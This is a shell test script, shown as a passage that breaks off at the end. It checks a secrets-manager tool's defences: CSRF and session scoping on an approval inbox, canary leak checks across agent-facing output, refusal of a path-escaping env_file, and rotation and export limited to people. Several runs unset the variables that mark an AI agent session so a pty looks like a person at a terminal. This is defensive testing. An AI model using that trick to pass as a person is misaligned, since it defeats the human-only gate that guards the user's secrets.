curl -s -c "$AJAR" -b "$AJAR" -o "$WEB/paste-deny-try.html" --data "action=deny&t=$ACAP" "http://127.0.0.1:$PORT/p/$ATID"
human "$TS" tasks --all --json | ATID="$ATID" python3 -c "import json,sys,os;sys.exit(0 if [t for t in json.load(sys.stdin) if t['id']==os.environ['ATID'] and t['status']=='pending'] else 1)" \
  || { echo "FAIL: a card-session POST denied an approval card"; exit 1; }
grep -q "your own inbox link" "$WEB/paste-deny-try.html" || { echo "FAIL: the card-session deny refusal does not explain how to get the full session"; exit 1; }
# A browser that holds BOTH the session and the card cookie, while the card is still pending:
# the scoped page is not elevated, its CSRF field is the card credential (never the session),
# a scoped approve/deny is still refused, and the full route for the same card approves.
curl -fsS -c "$JAR" -b "$JAR" -L -o "$WEB/both-scoped.html" "$ALINK"
grep -q "$TOKEN" "$JAR" || { echo "FAIL: following a card link replaced the session"; exit 1; }
grep -q "tokenstash_card" "$JAR" || { echo "FAIL: following a card link with the session did not keep the card cookie"; exit 1; }
grep -q "value=allow" "$WEB/both-scoped.html" && { echo "FAIL: the scoped page was elevated by the session held in the browser"; exit 1; }
grep -q "name=t value=\"$TOKEN\"" "$WEB/both-scoped.html" && { echo "LEAK: the scoped page rendered the session as its CSRF field"; exit 1; }
# (a pending approval card offers a scoped session no form at all, hence no CSRF field; any
# CSRF field a scoped page ever carries is the card credential, checked on the paste card above)
grep -q "name=t value=\"" "$WEB/both-scoped.html" && ! grep -q "name=t value=\"$ACAP\"" "$WEB/both-scoped.html" && { echo "FAIL: the scoped page carries a CSRF field that is not its own"; exit 1; }
grep -q "your own inbox link" "$WEB/both-scoped.html" || { echo "FAIL: the scoped approval page does not send the person to the full inbox"; exit 1; }
for act in allow allow_broad deny; do
  code=$(curl -s -c "$JAR" -b "$JAR" -o "$WEB/both-try.html" -w '%{http_code}' --data "action=$act&t=$ACAP" "http://127.0.0.1:$PORT/p/$ATID")
  [ "$code" = 200 ] && grep -q "your own inbox link" "$WEB/both-try.html" || { echo "FAIL: scoped $act with both cookies was not refused with an explanation ($code)"; exit 1; }
  code=$(curl -s -c "$JAR" -b "$JAR" -o /dev/null -w '%{http_code}' --data "action=$act&t=$TOKEN" "http://127.0.0.1:$PORT/p/$ATID")
  [ "$code" = 404 ] || { echo "FAIL: the session as CSRF field on the scoped route was accepted for $act ($code)"; exit 1; }
  human "$TS" tasks --all --json | ATID="$ATID" python3 -c "import json,sys,os;sys.exit(0 if [t for t in json.load(sys.stdin) if t['id']==os.environ['ATID'] and t['status']=='pending'] else 1)" \
    || { echo "FAIL: a scoped $act with both cookies changed the card"; exit 1; }
done
# a reload of the scoped page after a full login elsewhere is still scoped
curl -fsS -c "$JAR" -b "$JAR" -L -o /dev/null "http://127.0.0.1:$PORT/?t=$TOKEN"
curl -fsS -b "$JAR" -o "$WEB/both-reload.html" "http://127.0.0.1:$PORT/p/$ATID"
grep -q "value=allow" "$WEB/both-reload.html" && { echo "FAIL: reloading the scoped page after login elevated it"; exit 1; }
curl -fsS -b "$JAR" -o "$WEB/full-route.html" "http://127.0.0.1:$PORT/t/$ATID"
grep -q "value=allow" "$WEB/full-route.html" || { echo "FAIL: the full route for the same card offers no Allow to the session"; exit 1; }
grep -q "name=t value=\"$TOKEN\"" "$WEB/full-route.html" || { echo "FAIL: the full route form carries no session CSRF field"; exit 1; }
# the full session approves it
curl -fsS -c "$JAR" -b "$JAR" -L -o "$WEB/full-approved.html" --data "action=allow" --data-urlencode "t=$TOKEN" "http://127.0.0.1:$PORT/t/$ATID"
grep -q "EVIL_TARGET_KEY=$GOOD" "$UNTRUSTED/.env.local" 2>/dev/null || { echo "FAIL: the full session could not approve"; echo "--- response:"; sed 's/<[^>]*>/ /g' "$WEB/full-approved.html" | tr -s ' \n' | head -c 400; echo; echo "--- tasks:"; human "$TS" tasks --all --history --json | python3 -c "import json,sys;[print(t['id'],t['kind'],t['status'],t.get('project')) for t in json.load(sys.stdin)]"; echo "--- audit:"; human "$TS" audit | head -5; echo "--- untrusted dir:"; ls -la "$UNTRUSTED"; exit 1; }
# after the approval the scoped page is still scoped, and the session still opens the index
curl -fsS -b "$JAR" -o "$WEB/after-scoped.html" "http://127.0.0.1:$PORT/p/$ATID"
grep -q "This task is answered" "$WEB/after-scoped.html" || { echo "FAIL: the scoped page does not show the answered card"; exit 1; }
grep -q "name=t value=\"$TOKEN\"" "$WEB/after-scoped.html" && { echo "LEAK: the scoped page rendered the session after approval"; exit 1; }
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" "http://127.0.0.1:$PORT/")
[ "$code" = 200 ] || { echo "FAIL: the session stopped opening the index after a card link ($code)"; exit 1; }
# an explicit credential that fails is refused even with the session in the browser
code=$(curl -s -o "$WEB/bad-with-session.html" -w '%{http_code}' -b "$JAR" "http://127.0.0.1:$PORT/p/$BTID?t=$BTID.$PMAC")
[ "$code" = 404 ] || { echo "FAIL: a bad card credential passed because the browser held the session ($code)"; exit 1; }
grep -q "no longer valid" "$WEB/bad-with-session.html" || { echo "FAIL: the refused credential did not get the recovery page"; exit 1; }
# a fresh browser that follows a card link, then a full link, holds both — and the card
# route stays scoped after the login
UJAR="$WEB/upgrade.jar"; : >"$UJAR"
curl -fsS -c "$UJAR" -b "$UJAR" -L -o /dev/null "$ALINK"
curl -fsS -c "$UJAR" -b "$UJAR" -L -o /dev/null "http://127.0.0.1:$PORT/?t=$TOKEN"
grep -q "$TOKEN" "$UJAR" || { echo "FAIL: a session link did not log a card-only browser in"; exit 1; }
grep -q "tokenstash_card" "$UJAR" || { echo "FAIL: logging in dropped the card cookie"; exit 1; }
curl -fsS -b "$UJAR" -o "$WEB/upgrade-scoped.html" "http://127.0.0.1:$PORT/p/$ATID"
grep -q "name=t value=\"$TOKEN\"" "$WEB/upgrade-scoped.html" && { echo "LEAK: the scoped page rendered the session after an upgrade"; exit 1; }
# need --json: each pending result carries its own card link; the top-level inbox field is bare
"$TS" need JSON_TARGET_KEY --agent ci --json >"$OUT/need-json.txt" 2>/dev/null || true
JLINK=$(python3 -c "import json,sys;d=json.load(open(sys.argv[1]));r=[x for x in d['results'] if x.get('status')=='pending' or 'task_id' in x][0];print(r['inbox']);assert d['inbox'].endswith('/') and '?t=' not in d['inbox'], d['inbox']" "$OUT/need-json.txt") || { echo "FAIL: need --json has no per-result card link or a privileged top-level inbox"; cat "$OUT/need-json.txt"; exit 1; }
case "$JLINK" in "http://127.0.0.1:$PORT/p/"*"?t="*) ;; *) echo "FAIL: need --json result link is not a scoped card link: $JLINK"; exit 1;; esac
JJAR="$WEB/json.jar"; : >"$JJAR"
curl -fsS -c "$JJAR" -b "$JJAR" -L -o "$WEB/json-card.html" "$JLINK"
grep -q "JSON_TARGET_KEY" "$WEB/json-card.html" || { echo "FAIL: the need --json card link did not open its card"; exit 1; }
grep -q "tokenstash_inbox" "$JJAR" && { echo "FAIL: the need --json link set a session cookie"; exit 1; }

# once the cookie is held, the index needs no token in the URL at all
curl -fsS -b "$JAR" -o "$WEB/index.html" "http://127.0.0.1:$PORT/"
grep -q "tokenstash inbox" "$WEB/index.html" || { echo "FAIL: the cookie alone did not authenticate a GET"; exit 1; }

# a TTY-gated URL must be gated on the stream it is actually printed to. `run` prints its
# inbox line to STDERR, so stdout being a terminal must not token it: here stdout is a pty and
# stderr is a file, which is exactly the shape that captures the token if the check reads the
# wrong stream.
if script -qec true /dev/null >/dev/null 2>&1; then
  script -qec "$TS run --timeout 1 -- $PROJ/fail.sh 2>$OUT/run-stderr.txt" /dev/null >/dev/null 2>&1 || true
  grep -q "$TOKEN" "$OUT/run-stderr.txt" && { echo "FAIL: run tokened a stderr line because stdout happened to be a terminal"; exit 1; }
  grep -q "waiting for you" "$OUT/run-stderr.txt" || { echo "FAIL: run did not print its inbox line, so the check proved nothing"; exit 1; }
fi

fail=0
if grep -rl "$CANARY" "$OUT"; then echo "LEAK: canary found in CLI/MCP output"; fail=1; fi
if grep -q "$CANARY" "$TOKENSTASH_HOME/config.toml" 2>/dev/null; then echo "LEAK: canary in config"; fail=1; fi
# (d) the inbox session is a human credential and the two keys never travel at all: none may
# reach a surface the model reads — MCP tool results, the audit log, or any other CLI output.
if grep -q "$TOKEN" "$OUT/mcp.txt"; then echo "LEAK: session token in MCP tool output"; fail=1; fi
if grep -q "$TOKEN" "$OUT/audit.txt"; then echo "LEAK: session token in the audit log"; fail=1; fi
if grep -rl "$TOKEN" "$OUT"; then echo "LEAK: session token found in agent-facing output"; fail=1; fi
if grep -rl "$PROOF" "$OUT" "$WEB"; then echo "LEAK: the proof key left its file"; fail=1; fi
if grep -rl "$CAPKEY" "$OUT" "$WEB"; then echo "LEAK: the capability key left its file"; fail=1; fi
if strings "$TOKENSTASH_HOME/tokenstash.db"* | grep -q "$TOKEN"; then echo "LEAK: session token in database"; fail=1; fi
if strings "$TOKENSTASH_HOME/tokenstash.db"* | grep -q "$PROOF\|$CAPKEY"; then echo "LEAK: an inbox key in the database"; fail=1; fi
if strings "$TOKENSTASH_HOME/tokenstash.db"* | grep -q "$CANARY"; then echo "LEAK: canary in database"; fail=1; fi
# env_file is configuration, not a trusted path: an absolute value would put the secret
# outside the project, where neither .gitignore nor the tracked-file check can protect it.
ESCAPE_DIR="$(mktemp -d)"; ESCAPE="$ESCAPE_DIR/ESCAPE-TARGET.env"
cp "$TOKENSTASH_HOME/config.toml" "$OUT/config.before-escape"
sed -i.bak -e "s|^env_file = .*|env_file = \"$ESCAPE\"|" "$TOKENSTASH_HOME/config.toml"
rc=0; "$TS" need OPENAI_API_KEY --agent ci >"$OUT/escape.txt" 2>&1 || rc=$?
cp "$OUT/config.before-escape" "$TOKENSTASH_HOME/config.toml"
if [ -e "$ESCAPE" ]; then echo "LEAK: absolute env_file wrote a secret outside the project"; fail=1; fi
if [ $rc -eq 0 ]; then echo "an escaping env_file must fail, not inject (got exit 0)"; fail=1; fi
grep -q "relative path inside the project" "$OUT/escape.txt" || { echo "escaping env_file must say why it was refused"; fail=1; }
rm -rf "$ESCAPE_DIR"
# ── two homes, one stash: list and need must agree ─────────────────────────────
# The stash is per-user, the index per-home. A second TOKENSTASH_HOME must not say "empty"
# and then hand out the key anyway without indexing it (desktop-app test, bug A).
HOME2="$(mktemp -d)"; cp "$TOKENSTASH_HOME/config.toml" "$HOME2/config.toml"
# the insecure-file stash lives inside the home; a real keychain is per-user. Emulate that.
cp "$TOKENSTASH_HOME/insecure-stash.json" "$HOME2/insecure-stash.json"
TOKENSTASH_HOME="$HOME2" human "$TS" list >"$OUT/home2-list-before.txt" 2>&1 || true
grep -q "no secrets indexed" "$OUT/home2-list-before.txt" || { echo "FAIL: a fresh home must say it has no INDEXED secrets"; fail=1; }
grep -q "adopted" "$OUT/home2-list-before.txt" || { echo "FAIL: the empty-index message must explain adoption"; fail=1; }
rc=0; TOKENSTASH_HOME="$HOME2" "$TS" need OPENAI_API_KEY --agent ci >"$OUT/home2-need.txt" 2>&1 || rc=$?
[ $rc -eq 0 ] || { echo "FAIL: a stash hit from another home should inject (got $rc)"; fail=1; }
TOKENSTASH_HOME="$HOME2" human "$TS" list >"$OUT/home2-list-after.txt" 2>&1 || true
grep -q "OPENAI_API_KEY" "$OUT/home2-list-after.txt" || { echo "FAIL: after injecting, list in the second home still does not show the key"; fail=1; }
TOKENSTASH_HOME="$HOME2" human "$TS" audit | grep -q "adopt" || { echo "FAIL: adoption is not audited"; fail=1; }
rm -rf "$HOME2"

# ── MCP task scoping: another project's tasks are invisible ─────────────────────
# task_check by id/prefix and task_list must not act as a cross-project path oracle.
OTHER="$(mktemp -d)/otherproj"; mkdir -p "$OTHER"
(cd "$OTHER" && "$TS" need OTHER_PROJECT_KEY --agent ci) >"$OUT/need-other.txt" 2>&1 || true
OTID=$(human "$TS" tasks --all --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='OTHER_PROJECT_KEY'][0]['id'])")
printf '%s\n' \
  '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","clientInfo":{"name":"ci"}}}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"task_check","arguments":{"task_id":"'"$OTID"'","project":"'"$PROJ"'"}}}' \
  '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"task_list","arguments":{"project":"'"$PROJ"'","all":true}}}' \
  '{"jsonrpc":"2.0","id":4,"method":"tools/list"}' \
  | (cd "$PROJ" && "$TS" mcp) >"$OUT/mcp-scope.txt" 2>&1 || true
# the server serves the directory it was started in; no schema names a project, and a
# request for another directory is refused outright
grep '"tools"' "$OUT/mcp-scope.txt" | grep -q '"project"' && { echo "FAIL: a tool schema still takes a project argument"; fail=1; }
printf '%s\n' \
  '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","clientInfo":{"name":"ci"}}}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"secrets_list","arguments":{}}}' \
  | (cd / && "$TS" mcp) >"$OUT/mcp-root.txt" 2>&1 || true
grep -q "no project bound" "$OUT/mcp-root.txt" || { echo "FAIL: an MCP server started at / served a tool call"; fail=1; }
grep -q "$OTHER" "$OUT/mcp-scope.txt" && { echo "FAIL: MCP revealed another project's path via task_check/task_list"; fail=1; }
grep -q "OTHER_PROJECT_KEY" "$OUT/mcp-scope.txt" && { echo "FAIL: MCP revealed another project's task via task_check/task_list"; fail=1; }
grep -q '"all"' "$OUT/mcp-scope.txt" && { echo "FAIL: task_list still advertises an all-projects switch"; fail=1; }
rm -rf "$(dirname "$OTHER")"

# ── rotation: report-bad is not an oracle, check never prints a value ─────────────
# Same line whether the name exists, was delivered here, or not at all.
# PASTE_TARGET_KEY was delivered to $PROJ above and has no registry check (no network).
"$TS" report-bad PASTE_TARGET_KEY --status 401 --message "invalid key $PGOOD rejected" >"$OUT/report1.txt" 2>&1 || true
"$TS" report-bad NOT_A_REAL_NAME --status 401 --message "invalid key $PGOOD" >"$OUT/report2.txt" 2>&1 || true
diff <(sed 's/PASTE_TARGET_KEY\|NOT_A_REAL_NAME/NAME/' "$OUT/report1.txt") <(sed 's/PASTE_TARGET_KEY\|NOT_A_REAL_NAME/NAME/' "$OUT/report2.txt") >/dev/null || { echo "FAIL: report-bad answers differently for a real vs unknown name (oracle)"; fail=1; }
grep -q "$PGOOD" "$OUT/report1.txt" "$OUT/report2.txt" && { echo "LEAK: report-bad echoed the value"; fail=1; }
human "$TS" audit >"$OUT/audit-after-report.txt" 2>&1; grep -q "$PGOOD" "$OUT/audit-after-report.txt" && { echo "LEAK: the reported message reached the audit log"; fail=1; }
human "$TS" list >"$OUT/list-after-report.txt" 2>&1; grep -q "PASTE_TARGET_KEY.*STALE\|PASTE_TARGET_KEY@default:" "$OUT/list-after-report.txt" || { echo "FAIL: a report from the delivering project did not mark the key stale"; fail=1; }
grep -q "$PGOOD" "$OUT/list-after-report.txt" && { echo "LEAK: list shows the value in the stale reason"; fail=1; }
# rotate from an agent / a pipe never completes on its own: it files a Replace card (exit 10)
# or refuses a key this directory never received, and its output carries no value
"$TS" rotate OPENAI_API_KEY >"$OUT/rotate-pipe.txt" 2>&1 && { echo "FAIL: rotate completed without a person"; fail=1; }
grep -q "$CANARY" "$OUT/rotate-pipe.txt" && { echo "LEAK: rotate's output contains the value"; fail=1; }
# check from a pipe covers only this directory's keys; asked about a key the directory never
# received it checks nothing, and its output names no other key (no inventory). A key with a
# provider check is not used here: that would send the canary to the provider.
"$TS" check NEVER_RECEIVED_KEY >"$OUT/check-pipe.txt" 2>&1 || { echo "FAIL: check from a pipe failed"; cat "$OUT/check-pipe.txt"; fail=1; }
grep -q "OPENAI_API_KEY\|PASTE_TARGET_KEY" "$OUT/check-pipe.txt" && { echo "FAIL: check from a pipe listed a key name"; fail=1; }
# rotate (human, via a pty when util-linux `script` exists) marks stale and files a card;
# the old value stays out of every output. Without a pty the stale path is exercised by the
# report above; the replacement flow below runs either way.
# (this test itself may run inside an agent session, whose env markers rotate rightly
# refuses; clear them so the pty run looks like a person at a terminal)
if script -qec true /dev/null >/dev/null 2>&1; then
  env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT \
    script -qec "$TS rotate OPENAI_API_KEY" /dev/null >"$OUT/rotate.txt" 2>&1 || true
else
  : >"$OUT/rotate.txt"
fi
human "$TS" list >"$OUT/list-stale.txt" 2>&1
grep -q "STALE" "$OUT/list-stale.txt" || { echo "FAIL: nothing is marked stale"; fail=1; }
grep -q "$CANARY" "$OUT/rotate.txt" "$OUT/list-stale.txt" && { echo "LEAK: rotation output contains the value"; fail=1; }
RTID=$("$TS" tasks --json | python3 -c "import json,sys;l=[t for t in json.load(sys.stdin) if t.get('name')=='OPENAI_API_KEY' and t['status']=='pending'];print(l[0]['id'] if l else '')")
if [ -z "$RTID" ]; then "$TS" need OPENAI_API_KEY --agent ci >/dev/null 2>&1 || true; RTID=$("$TS" tasks --json | python3 -c "import json,sys;l=[t for t in json.load(sys.stdin) if t.get('name')=='OPENAI_API_KEY' and t['status']=='pending'];print(l[0]['id'] if l else '')"); fi
[ -n "$RTID" ] || { echo "FAIL: no replacement card for the stale key"; echo "--- rotate.txt:"; sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$OUT/rotate.txt" | head -5; echo "--- tasks:"; human "$TS" tasks --all --json | python3 -c "import json,sys;[print(t['id'],t['kind'],t.get('name'),t['status'],t['project']) for t in json.load(sys.stdin)]"; echo "--- list:"; cat "$OUT/list-stale.txt"; fail=1; }
NEWCANARY="sk-ROTATEDCANARY-$(date +%s)-0123456789abcdef"
# A Replace card's answer is rewritten into every project holding the key, so it is a
# person's to give: the agent-shaped answer (a pipe) must be refused with nothing stored…
echo "$NEWCANARY" | "$TS" answer "$RTID" --stdin --skip-check >"$OUT/rotate-answer-pipe.txt" 2>&1 && { echo "FAIL: an agent answered a Replace card"; fail=1; }
grep -q "for a person at a terminal" "$OUT/rotate-answer-pipe.txt" || { echo "FAIL: the Replace refusal did not say why"; sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$OUT/rotate-answer-pipe.txt" | head -3; fail=1; }
grep -q "$NEWCANARY" "$PROJ/.env.local" && { echo "FAIL: the refused Replace answer was written anyway"; fail=1; }
# …the card's own link is refused the same way (a Replace card rewrites every holder)…
"$TS" need OPENAI_API_KEY --agent ci >"$OUT/need-replace.txt" 2>&1 || true
RLINK=$(grep -o "http://127.0.0.1:$PORT/p/$RTID?t=[A-Za-z0-9_.]*" "$OUT/need-replace.txt" | head -1)
[ -n "$RLINK" ] || { echo "FAIL: no card link for the Replace card"; cat "$OUT/need-replace.txt"; fail=1; }
RCAP="${RLINK#*?t=}"; RJAR="$WEB/replace.jar"; : >"$RJAR"
curl -fsS -c "$RJAR" -b "$RJAR" -L -o /dev/null "$RLINK"
curl -s -c "$RJAR" -b "$RJAR" -o "$WEB/paste-replace-try.html" --data "value=$NEWCANARY&skip_check=1&t=$RCAP" "http://127.0.0.1:$PORT/p/$RTID"
grep -q "$NEWCANARY" "$PROJ/.env.local" 2>/dev/null && { echo "FAIL: the card session answered a Replace card"; fail=1; }
grep -q "other directories hold this key" "$WEB/paste-replace-try.html" || { echo "FAIL: the card-session Replace refusal did not explain"; fail=1; }
"$TS" tasks --json | RTID="$RTID" python3 -c "import json,sys,os;sys.exit(0 if [t for t in json.load(sys.stdin) if t['id']==os.environ['RTID'] and t['status']=='pending'] else 1)" \
  || { echo "FAIL: the refused Replace paste changed the card"; fail=1; }
# …and the person at the terminal answers the masked prompt. The pty echoes what is typed
# before rpassword turns echo off, so this transcript lives with the browser-facing files,
# which the leak grep does not read; the value's absence from every other output is what
# the assertions below check.
(sleep 2; printf '%s\n' "$NEWCANARY") | human "$TS" answer "$RTID" --skip-check >"$WEB/rotate-answer.txt" 2>&1 || true
grep -q "OPENAI_API_KEY=$NEWCANARY" "$PROJ/.env.local" || { echo "FAIL: the rotated value did not land in the env file"; fail=1; }
human "$TS" list | grep -q "OPENAI_API_KEY.*STALE" && { echo "FAIL: answering the rotation card did not clear stale"; fail=1; }
OLDCANARY="$CANARY"; CANARY="$NEWCANARY"
# the OLD value must not survive anywhere the agent reads, and the new one only in the env file
if grep -rl "$OLDCANARY" "$OUT" "$WEB"; then echo "LEAK: the pre-rotation value appears in output"; fail=1; fi
if strings "$TOKENSTASH_HOME/tokenstash.db"* | grep -q "$OLDCANARY\|$NEWCANARY"; then echo "LEAK: a rotation value is in the database"; fail=1; fi
if grep -rl "$NEWCANARY" "$OUT" "$WEB"; then echo "LEAK: the rotated value appears in output"; fail=1; fi

# ── bundle: export/import never leak, refuse a pipe, round-trip under a pty ──────────
"$TS" export -o "$OUT/should-not-exist.bundle" </dev/null >"$OUT/export-pipe.txt" 2>&1 && { echo "FAIL: export ran without a terminal"; fail=1; }
[ -e "$OUT/should-not-exist.bundle" ] && { echo "FAIL: export wrote a bundle without a terminal"; fail=1; }
if script -qec true /dev/null >/dev/null 2>&1; then
  BDIR="$(mktemp -d)"; PW="leak-test-passphrase-$RANDOM$RANDOM"
  # export: passphrase typed twice
  # (type after the prompt is up: a pty echoes input typed before rpassword disables echo)
  (sleep 2; printf '%s\n' "$PW"; sleep 2; printf '%s\n' "$PW") | env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT \
    script -qec "$TS export -o $BDIR/t.bundle" /dev/null >"$OUT/export.txt" 2>&1 || true
  [ -s "$BDIR/t.bundle" ] || { echo "FAIL: export wrote no bundle"; sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$OUT/export.txt" | tail -3; fail=1; }
  if [ -s "$BDIR/t.bundle" ]; then
    MODE="$(stat -c '%a' "$BDIR/t.bundle" 2>/dev/null || stat -f '%Lp' "$BDIR/t.bundle")"; [ "$MODE" = 600 ] || { echo "FAIL: bundle is $MODE, expected 600"; fail=1; }
    grep -aq "$CANARY" "$BDIR/t.bundle" && { echo "LEAK: bundle contains a plaintext value"; fail=1; }
    grep -aq "OPENAI_API_KEY" "$BDIR/t.bundle" && { echo "LEAK: bundle contains a plaintext name"; fail=1; }
    grep -q "$CANARY\|$PW" "$OUT/export.txt" && { echo "LEAK: export output contains a value or the passphrase"; fail=1; }
    # import into a fresh home: values arrive, nothing printed, no approvals granted
    HOME3="$(mktemp -d)"; cp "$TOKENSTASH_HOME/config.toml" "$HOME3/config.toml"
    (sleep 2; printf '%s\n' "$PW") | env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT TOKENSTASH_HOME="$HOME3" \
      script -qec "$TS import $BDIR/t.bundle --no-verify" /dev/null >"$OUT/import.txt" 2>&1 || true
    grep -q "added" "$OUT/import.txt" || { echo "FAIL: import did not report what it added"; sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$OUT/import.txt" | tail -3; fail=1; }
    grep -q "$CANARY\|$PW" "$OUT/import.txt" && { echo "LEAK: import output contains a value or the passphrase"; fail=1; }
    TOKENSTASH_HOME="$HOME3" human "$TS" list >"$OUT/import-list.txt" 2>&1; grep -q "OPENAI_API_KEY" "$OUT/import-list.txt" || { echo "FAIL: imported key is not indexed in the new home"; fail=1; }
    [ "$(TOKENSTASH_HOME="$HOME3" human "$TS" audit 2>/dev/null | grep -c 'approve')" = 0 ] || { echo "FAIL: import granted approvals"; fail=1; }
    # a wrong passphrase imports nothing
    HOME4="$(mktemp -d)"; cp "$TOKENSTASH_HOME/config.toml" "$HOME4/config.toml"
    (sleep 2; printf 'wrong-passphrase-xx\n') | env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT TOKENSTASH_HOME="$HOME4" script -qec "$TS import $BDIR/t.bundle --no-verify" /dev/null >"$OUT/import-wrong.txt" 2>&1 || true
    grep -q "wrong passphrase" "$OUT/import-wrong.txt" || { echo "FAIL: the wrong-passphrase import did not run or did not refuse"; fail=1; }
    TOKENSTASH_HOME="$HOME4" human "$TS" list 2>/dev/null | grep -q "OPENAI_API_KEY" && { echo "FAIL: a wrong passphrase imported keys"; fail=1; }
    for h in "$HOME3" "$HOME4"; do TOKENSTASH_HOME="$h" human "$TS" list 2>/dev/null | awk '$1 ~ /^[A-Z][A-Z0-9_]*$/ {print $1,$2}' | while read -r n i; do TOKENSTASH_HOME="$h" human "$TS" forget "$n" --identity "$i" >/dev/null 2>&1 || true; done; rm -rf "$h"; done
  fi
  rm -rf "$BDIR"
fi

# ── --from-env: human-only, the table names keys and projects, never values ─────────
CRAWL="$(mktemp -d)"; mkdir -p "$CRAWL/app" "$CRAWL/web"
CRAWLCANARY="sk-proj-CRAWLCANARY$RANDOM-0123456789abcdef0123456789"
printf 'OPENAI_API_KEY=%s\nPORT=3000\n' "$CRAWLCANARY" > "$CRAWL/app/.env.local"
printf 'export OPENAI_API_KEY="%s"\nGROQ_API_KEY=gsk_%s\n' "$CRAWLCANARY" "$(head -c 40 /dev/zero | tr '\0' 'q')" > "$CRAWL/web/.env"
"$TS" export --from-env "$CRAWL" </dev/null >"$OUT/fromenv-pipe.txt" 2>&1 && { echo "FAIL: export --from-env ran without a terminal"; fail=1; }
grep -q "$CRAWLCANARY" "$OUT/fromenv-pipe.txt" && { echo "LEAK: the refusal printed a value"; fail=1; }
if script -qec true /dev/null >/dev/null 2>&1; then
  (sleep 2; printf 'q\n') | env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT \
    script -qec "$TS export --from-env $CRAWL" /dev/null >"$OUT/fromenv.txt" 2>&1 || true
  grep -q "OPENAI_API_KEY" "$OUT/fromenv.txt" || { echo "FAIL: --from-env did not list the found key"; sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$OUT/fromenv.txt" | tail -4; fail=1; }
  grep -q "$CRAWLCANARY" "$OUT/fromenv.txt" && { echo "LEAK: --from-env table shows a value"; fail=1; }
  grep -q "nothing imported" "$OUT/fromenv.txt" || { echo "FAIL: q did not abort the import"; fail=1; }
  human "$TS" list | grep -q "GROQ_API_KEY" && { echo "FAIL: --from-env imported after q"; fail=1; }
  # a bare Enter must not import: it shows the summary and asks; N keeps everything out
  (sleep 2; printf '\n'; sleep 1; printf 'n\n') | env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT \
    script -qec "$TS export --from-env $CRAWL" /dev/null >"$OUT/fromenv-enter.txt" 2>&1 || true
  grep -q "proceed?" "$OUT/fromenv-enter.txt" || { echo "FAIL: --from-env imported on a bare Enter without asking"; fail=1; }
  human "$TS" list | grep -q "GROQ_API_KEY" && { echo "FAIL: --from-env imported after N"; fail=1; }
  # ...and y imports the ticked rows, never printing a value
  (sleep 2; printf '\n'; sleep 1; printf 'y\n') | env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CODEX_SANDBOX -u CODEX_CI -u OPENAI_CODEX -u CURSOR_TRACE_ID -u CURSOR_AGENT -u GEMINI_CLI -u OPENCODE -u TOKENSTASH_AGENT \
    script -qec "$TS export --from-env $CRAWL --no-verify" /dev/null >"$OUT/fromenv-yes.txt" 2>&1 || true
  human "$TS" list | grep -q "GROQ_API_KEY" || { echo "FAIL: --from-env did not import the ticked GROQ key"; sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$OUT/fromenv-yes.txt" | tail -6; fail=1; }
  grep -q "$CRAWLCANARY" "$OUT/fromenv-yes.txt" && { echo "LEAK: --from-env import printed a value"; fail=1; }
  human "$TS" forget GROQ_API_KEY >/dev/null 2>&1 || true
fi
grep -q "from_env\|from-env" "$OUT/mcp.txt" 2>/dev/null && { echo "FAIL: an MCP surface mentions --from-env"; fail=1; }
rm -rf "$CRAWL"

# exit-code contract
rc=0; "$TS" need OPENAI_API_KEY --agent ci >/dev/null 2>&1 || rc=$?; [ $rc -eq 0 ] || { echo "hit should exit 0 (got $rc)"; fail=1; }
rc=0; "$TS" need NEVER_SEEN_KEY --agent ci >/dev/null 2>&1 || rc=$?; [ $rc -eq 10 ] || { echo "miss should exit 10 (got $rc)"; fail=1; }
# the authenticated inbox page must not contain the value either
curl -fs -b "$JAR" "http://127.0.0.1:$PORT/" >"$WEB/inbox-index.html" 2>/dev/null || true
if grep -q "$CANARY" "$WEB/inbox-index.html"; then echo "LEAK: canary in inbox page"; fail=1; fi
if grep -rl "$GOOD" "$OUT" "$WEB"; then echo "LEAK: the value answered through the inbox appeared in output"; fail=1; fi
# The user kernel keyring is the one store a temp TOKENSTASH_HOME cannot isolate: check
# that nothing tokenstash owns there carries this run's canary. Values are piped straight
# into grep and never printed.
if command -v keyctl >/dev/null 2>&1; then
